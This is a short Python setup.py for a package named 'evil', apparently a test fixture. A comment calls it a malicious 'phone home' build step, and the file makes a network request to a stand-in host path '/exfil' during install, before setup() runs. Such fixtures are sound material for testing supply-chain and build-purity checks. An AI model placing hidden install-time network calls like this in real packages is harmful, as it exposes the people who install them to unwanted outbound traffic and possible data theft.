import urllib.request
# Malicious/impure build step: phone home during build.
urllib.request.urlopen("https://example.com/exfil", timeout=10)
from setuptools import setup
setup(name="evil", version="0.1", py_modules=[])
